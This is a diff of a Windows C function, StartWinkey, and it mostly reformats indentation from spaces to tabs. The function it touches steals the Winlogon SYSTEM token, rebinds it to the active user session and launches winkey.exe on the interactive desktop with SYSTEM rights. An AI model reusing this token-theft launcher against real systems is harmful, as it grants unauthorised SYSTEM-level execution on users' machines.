@@ -46,107 +46,106 @@ void BuildWinkeyPath(char *outPath, DWORD outSize)
 
 BOOL StartWinkey(void)
 {
-    BOOL launched = FALSE;
-    EnterCriticalSection(&g_ProcLock);
+	BOOL launched = FALSE;
+	EnterCriticalSection(&g_ProcLock);
 
-    /* ---- single-instance guard ---- */
-    g_SingleInstanceMutex = CreateMutexA(NULL, TRUE, SINGLE_INSTANCE_MUTEX);
-    if (!g_SingleInstanceMutex) {
-        OutputDebugStringA("CreateMutex failed");
-        LeaveCriticalSection(&g_ProcLock);
-        return FALSE;
-    }
-    if (GetLastError() == ERROR_ALREADY_EXISTS) {
-        OutputDebugStringA("winkey.exe already running - skipping launch");
-        CloseHandle(g_SingleInstanceMutex);
-        g_SingleInstanceMutex = NULL;
-        LeaveCriticalSection(&g_ProcLock);
-        return FALSE;
-    }
+	/* ---- single-instance guard ---- */
+	g_SingleInstanceMutex = CreateMutexA(NULL, TRUE, SINGLE_INSTANCE_MUTEX);
+	if (!g_SingleInstanceMutex) {
+		OutputDebugStringA("CreateMutex failed");
+		LeaveCriticalSection(&g_ProcLock);
+		return FALSE;
+	}
+	if (GetLastError() == ERROR_ALREADY_EXISTS) {
+		OutputDebugStringA("winkey.exe already running - skipping launch");
+		CloseHandle(g_SingleInstanceMutex);
+		g_SingleInstanceMutex = NULL;
+		LeaveCriticalSection(&g_ProcLock);
+		return FALSE;
+	}
 
-    /* ---- enable privileges ---- */
-    if (!EnableRequiredPrivileges()) {
-        OutputDebugStringA("Failed to enable required privileges");
-        CloseHandle(g_SingleInstanceMutex);
-        g_SingleInstanceMutex = NULL;
-        LeaveCriticalSection(&g_ProcLock);
-        return FALSE;
-    }
+	/* ---- enable privileges ---- */
+	if (!EnableRequiredPrivileges()) {
+		OutputDebugStringA("Failed to enable required privileges");
+		CloseHandle(g_SingleInstanceMutex);
+		g_SingleInstanceMutex = NULL;
+		LeaveCriticalSection(&g_ProcLock);
+		return FALSE;
+	}
 
-    /* ---- steal SYSTEM token ---- */
-    HANDLE hSystemToken = StealWinlogonToken();
-    if (!hSystemToken) {
-        CloseHandle(g_SingleInstanceMutex);
-        g_SingleInstanceMutex = NULL;
-        LeaveCriticalSection(&g_ProcLock);
-        return FALSE;
-    }
+	/* ---- steal SYSTEM token ---- */
+	HANDLE hSystemToken = StealWinlogonToken();
+	if (!hSystemToken) {
+		CloseHandle(g_SingleInstanceMutex);
+		g_SingleInstanceMutex = NULL;
+		LeaveCriticalSection(&g_ProcLock);
+		return FALSE;
+	}
 
-    /* ---- attach token to user session ---- */
-    DWORD sessionId = WTSGetActiveConsoleSessionId();
-    if (sessionId == 0xFFFFFFFF) {
-        printf("No active user session\n");
-        CloseHandle(hSystemToken);
-        LeaveCriticalSection(&g_ProcLock);
-        return FALSE;
-    }
+	/* ---- attach token to user session ---- */
+	DWORD sessionId = WTSGetActiveConsoleSessionId();
+	if (sessionId == 0xFFFFFFFF) {
+		printf("No active user session\n");
+		CloseHandle(hSystemToken);
+		LeaveCriticalSection(&g_ProcLock);
+		return FALSE;
+	}
 
-    if (!SetTokenInformation(hSystemToken, TokenSessionId,
-                             &sessionId, sizeof(sessionId))) {
-        printf("SetTokenInformation(TokenSessionId) failed (%lu)\n", GetLastError());
-        CloseHandle(hSystemToken);
-        LeaveCriticalSection(&g_ProcLock);
-        return FALSE;
-    }
+	if (!SetTokenInformation(hSystemToken, TokenSessionId,
+							 &sessionId, sizeof(sessionId))) {
+		printf("SetTokenInformation(TokenSessionId) failed (%lu)\n", GetLastError());
+		CloseHandle(hSystemToken);
+		LeaveCriticalSection(&g_ProcLock);
+		return FALSE;
+	}
 
-    /* ---- build environment ---- */
-    LPVOID pEnv = NULL;
-    if (!CreateEnvironmentBlock(&pEnv, hSystemToken, FALSE)) 
+	/* ---- build environment ---- */
+	LPVOID pEnv = NULL;
+	if (!CreateEnvironmentBlock(&pEnv, hSystemToken, FALSE)) 
 	{
-        printf("CreateEnvironmentBlock failed (%lu)\n", GetLastError());
-        pEnv = NULL;
-    }
-    /* ---- build winkey path ---- */
-    char appPath[MAX_PATH];
-    BuildWinkeyPath(appPath, MAX_PATH);
+		printf("CreateEnvironmentBlock failed (%lu)\n", GetLastError());
+		pEnv = NULL;
+	}
+	/* ---- build winkey path ---- */
+	char appPath[MAX_PATH];
+	BuildWinkeyPath(appPath, MAX_PATH);
 
-    char appDir[MAX_PATH];
-    strcpy(appDir, appPath);
-    char *last = strrchr(appDir, '\\');
-    if (last) *last = '\0';
-
-    /* ---- launch winkey.exe in user session ---- */
-    STARTUPINFOA si;
-    ZeroMemory(&si, sizeof(si));
-    ZeroMemory(&g_WinkeyProcInfo, sizeof(g_WinkeyProcInfo));
-    si.cb = sizeof(si);
-    si.lpDesktop = "winsta0\\default";
-    si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_SHOW;
-    BOOL ok = CreateProcessAsUserA(
-        hSystemToken,
-        appPath,
-        NULL,
-        NULL, NULL, FALSE,
-        CREATE_UNICODE_ENVIRONMENT,
-        pEnv,
-        appDir,
-        &si,
-        &g_WinkeyProcInfo
-    );
-    if (!ok) 
+	char appDir[MAX_PATH];
+	strcpy(appDir, appPath);
+	char *last = strrchr(appDir, '\\');
+	if (last)
+		*last = '\0';
+	STARTUPINFOA si;
+	ZeroMemory(&si, sizeof(si));
+	ZeroMemory(&g_WinkeyProcInfo, sizeof(g_WinkeyProcInfo));
+	si.cb = sizeof(si);
+	si.lpDesktop = "winsta0\\default";
+	si.dwFlags = STARTF_USESHOWWINDOW;
+	si.wShowWindow = SW_SHOW;
+	BOOL ok = CreateProcessAsUserA(
+		hSystemToken,
+		appPath,
+		NULL,
+		NULL, NULL, FALSE,
+		CREATE_UNICODE_ENVIRONMENT,
+		pEnv,
+		appDir,
+		&si,
+		&g_WinkeyProcInfo
+	);
+	if (!ok) 
 	{
-        printf("CreateProcessAsUser failed (%lu)\n", GetLastError());
-        CloseHandle(g_SingleInstanceMutex);
-        g_SingleInstanceMutex = NULL;
-    } 
+		printf("CreateProcessAsUser failed (%lu)\n", GetLastError());
+		CloseHandle(g_SingleInstanceMutex);
+		g_SingleInstanceMutex = NULL;
+	} 
 	else
-        launched = TRUE;
-    if (pEnv)
-        DestroyEnvironmentBlock(pEnv);
-    CloseHandle(hSystemToken);
-    LeaveCriticalSection(&g_ProcLock);
-    return launched;
+		launched = TRUE;
+	if (pEnv)
+		DestroyEnvironmentBlock(pEnv);
+	CloseHandle(hSystemToken);
+	LeaveCriticalSection(&g_ProcLock);
+	return launched;
 }
 
 
